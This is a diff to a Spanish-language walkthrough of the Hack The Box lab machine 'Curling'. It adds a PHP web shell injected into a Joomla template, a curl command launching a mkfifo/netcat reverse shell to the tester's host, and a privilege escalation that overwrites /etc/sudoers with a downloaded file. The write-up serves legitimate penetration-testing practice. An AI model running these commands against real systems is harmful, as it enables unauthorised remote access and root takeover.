@@ -128,20 +128,179 @@ Parece que un posible usuario sea 'Floris'. Voy a probar a acceder con ese usuar
 
 <img src='/images/portfolio/curling/superuser.png' width='450' height=auto><br/><br/>
 
+Joomla
+------
+
 Efectivamente esas eran las credenciales del Super User, ahora voy a probar estas mismas credenciales para acceder a la ruta /administrator.<br/>
 
 <img src='/images/portfolio/curling/joomla.png' width='900' height=auto><br/><br/>
 
-Consigo acceso como superusuario a la plataforma 'Joomla'. Buscando alguna forma de explotar esta plataforma para un posible reverse shell, encontré que en Joomla se pueden subir archivos para instalar extensiones.<br/><br/>
+Consigo acceso como superusuario a la plataforma 'Joomla'. Buscando alguna forma de explotar esta plataforma para un posible reverse shell, encontré el siguiente artículo (https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/joomla#rce) el cual explica como se puede conseguir un RCE.<br/><br/>
 
-Por tanto probaré a crear y subir un exploit que me permita obtener un reverse shell para tener acceso remoto al servidor.<br/>
+Por tanto entré en Templates > Templates > Protostar Details and Files y elegí una plantilla para inyectar código. En mi caso elegí 'error.php' e inyecté la siguiente línea de código 'system($_REQUEST[​'pwn'​]);'.<br/>
+
+<img src='/images/portfolio/curling/errorPHP.png' width='900' height=auto><br/><br/>
+
+Para acceder a ese recurso necesitaré la siguiente dirección 'http://10.10.10.150/templates/protostar/error.php?pwn=id'. Cuando accedo puedo ver lo siguiente.<br/>
+
+<img src='/images/portfolio/curling/pwnID.png' width='900' height=auto><br/><br/>
+
+Ahora para obtener un reverse shell con el que pueda interactuar, lo hago de la siguiente manera.<br/>
 
     ┌──(root㉿kali)-[/home/nico/htb]
-    └─# msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.14.31 LPORT=1234 -o shell.php         
-    [-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
-    [-] No arch selected, selecting arch: php from the payload
-    No encoder specified, outputting raw payload
-    Payload size: 1112 bytes
-    Saved as: shell.php
+    └─# curl http://10.10.10.150/templates/protostar/error.php -G --data-urlencode 'pwn=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.31 1234 > /tmp/f'
+
+<br/>
+
+    ┌──(root㉿kali)-[/home/nico/htb]
+    └─# nc -lnvp 1234           
+    Listening on 0.0.0.0 1234
+    Connection received on 10.10.10.150 52310
+    /bin/sh: 0: can't access tty; job control turned off
+    $ whoami
+    www-data
+    $
+
+Me queda intentar obtener el flag del usuario. Voy a ir a /home a ver que me encuentro.<br/>
+
+    $ cd /home
+    $ ls
+    floris
+    $ cd floris
+    $ ls
+    admin-area
+    password_backup
+    user.txt
+    $ cat user.txt
+    cat: user.txt: Permission denied
+    $
+
+Como se ha podido ver, no tengo permiso para abrir el fichero 'user.txt'. Sin embargo hay un fichero llamado 'password_backup' que puede ser interesante, voy a sacar el contenido a ver que es.<br/>
+
+    $ cat password_backup
+    00000000: 425a 6839 3141 5926 5359 819b bb48 0000  BZh91AY&SY...H..
+    00000010: 17ff fffc 41cf 05f9 5029 6176 61cc 3a34  ....A...P)ava.:4
+    00000020: 4edc cccc 6e11 5400 23ab 4025 f802 1960  N...n.T.#.@%...`
+    00000030: 2018 0ca0 0092 1c7a 8340 0000 0000 0000   ......z.@......
+    00000040: 0680 6988 3468 6469 89a6 d439 ea68 c800  ..i.4hdi...9.h..
+    00000050: 000f 51a0 0064 681a 069e a190 0000 0034  ..Q..dh........4
+    00000060: 6900 0781 3501 6e18 c2d7 8c98 874a 13a0  i...5.n......J..
+    00000070: 0868 ae19 c02a b0c1 7d79 2ec2 3c7e 9d78  .h...*..}y..<~.x
+    00000080: f53e 0809 f073 5654 c27a 4886 dfa2 e931  .>...sVT.zH....1
+    00000090: c856 921b 1221 3385 6046 a2dd c173 0d22  .V...!3.`F...s."
+    000000a0: b996 6ed4 0cdb 8737 6a3a 58ea 6411 5290  ..n....7j:X.d.R.
+    000000b0: ad6b b12f 0813 8120 8205 a5f5 2970 c503  .k./... ....)p..
+    000000c0: 37db ab3b e000 ef85 f439 a414 8850 1843  7..;.....9...P.C
+    000000d0: 8259 be50 0986 1e48 42d5 13ea 1c2a 098c  .Y.P...HB....*..
+    000000e0: 8a47 ab1d 20a7 5540 72ff 1772 4538 5090  .G.. .U@r..rE8P.
+    000000f0: 819b bb48                                ...H
+
+Parece tratase de un contenido en hexadecimal. Voy a decodificarlo a ver que obtengo.<br/>
+
+    $ cd /tmp
+    $ cp /home/floris/password_backup .
+    $ ls
+    f
+    password_backup
+    $ cat password_backup | xxd -r > bak
+    $ file bak
+    bak: bzip2 compressed data, block size = 900k
+    $
+
+Al decodificarlo, se obtiene un fichero en formato 'bzip2'. Voy a descomprimirlo a ver que saco.<br/>
+
+    $ bzip2 -d bak
+    bzip2: Can't guess original name for bak -- using bak.out                                                                                                    
+    $ file bak.out
+    bak.out: gzip compressed data, was "password", last modified: Tue May 22 19:16:20 2018, from Unix                                                            
+    $ mv bak.out bak.gz
+    $ gzip -d bak.gz
+    $ file bak
+    bak: bzip2 compressed data, block size = 900k
+    $ bzip2 -d bak
+    bzip2: Can't guess original name for bak -- using bak.out
+    $ file bak.out
+    bak.out: POSIX tar archive (GNU)
+    $ tar xf bak.out
+    $ ls
+    bak.out
+    f
+    password.txt
+    password_backup
+    $ cat password.txt
+    5d<wdCbdZu)|hChXll
+    $
+
+SSH
+------
+
+Tras una serie de descompresiones, obtengo lo que parece ser la contraseña del usuario con nombre 'floris'. Me voy a conectar a través de ssh con esas credenciales a ver si así, finalmente, puedo conseguir el flag de usuario. <br/>
+
+    ┌──(root㉿kali)-[/home/nico/htb]
+    └─# ssh floris@10.10.10.150
+    floris@10.10.10.150's password: 
+    Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-156-generic x86_64)
+
+    * Documentation:  https://help.ubuntu.com
+    * Management:     https://landscape.canonical.com
+    * Support:        https://ubuntu.com/advantage
+
+    System information as of Wed Jan 24 10:54:35 UTC 2024
+
+    System load:  0.0               Processes:            179
+    Usage of /:   62.3% of 3.87GB   Users logged in:      0
+    Memory usage: 21%               IP address for ens33: 10.10.10.150
+    Swap usage:   0%
 
 
+    0 updates can be applied immediately.
+
+    Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+    applicable law.
+
+
+    Last login: Wed Sep  8 11:42:07 2021 from 10.10.14.15
+    floris@curling:~$ ls
+    admin-area  password_backup  user.txt
+    floris@curling:~$ cat user.txt
+    aa95098c3c19c00e6d6c2e6c90765564
+
+Ya pude conseguir el flag de usuario. Ahora llega el momento del escalado de privilegios.
+
+Escalado de privilegios
+------
+
+Algo interesante es el directorio 'admin-area' en la carpeta de floris. Vamos a ver que hay dentro.<br/>
+
+    floris@curling:~/admin-area$ ls -lah
+    total 28K
+    drwxr-x--- 2 root   floris 4.0K Aug  2  2022 .
+    drwxr-xr-x 6 floris floris 4.0K Jan 24 11:06 ..
+    -rw-rw---- 1 root   floris   25 Jan 24 11:07 input
+    -rw-rw---- 1 root   floris  14K Jan 24 11:07 report
+    floris@curling:~/admin-area$ cat input
+    url = "http://127.0.0.1"
+
+Resulta que contiene dos ficheros, uno llamado 'input' y el otro llamado 'report', el input contiene una URL para la cual el report mostrará la salida. En el caso actual, input contiene la URL base y report contiene el HTML de la página inicial. Puedo utilizar este proceso a mi favor cambiando la URL del input a una dirección con contenido confidencial, voy a probar.<br/><br/>
+
+Lo que voy a hacer va a ser, crearme un fichero 'sudoers' en mi máquina que contenga al usuario 'floris' y descargarlo en la víctima en el directorio /etc. Metiéndole el siguiente contenido al fichero 'input', se sobreescribirá el fichero 'sudoers' añadiendo a 'floris' como usuario root.<br/>
+
+    url = "http://10.10.14.31/sudoers"
+    output = "/etc/sudoers"
+    user-agent = "nicgarc/1.0"
+
+Una vez que guardo los cambios en el fichero 'input', automaticamente recibo un request de GET para el fichero 'sudoers' por parte de la víctima a mi máquina local como se puede ver a continuación.<br/>
+
+    ┌──(root㉿kali)-[/home/nico/htb/www]
+    └─# python3 -m http.server 80
+    Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+    10.10.10.150 - - [24/Jan/2024 12:33:02] "GET /sudoers HTTP/1.1" 200 -
+
+Ahora solo queda hacer 'sudo su -' y tendría acceso como root pudiendo obtener el flag del root.<br/>
+
+    floris@curling:~/admin-area$ sudo su -
+    root@curling:~# cd /root
+    root@curling:~# ls
+    default.txt  root.txt
+    root@curling:~# cat root.txt 
+    409a86484fab3e76d47337d94b8fb573
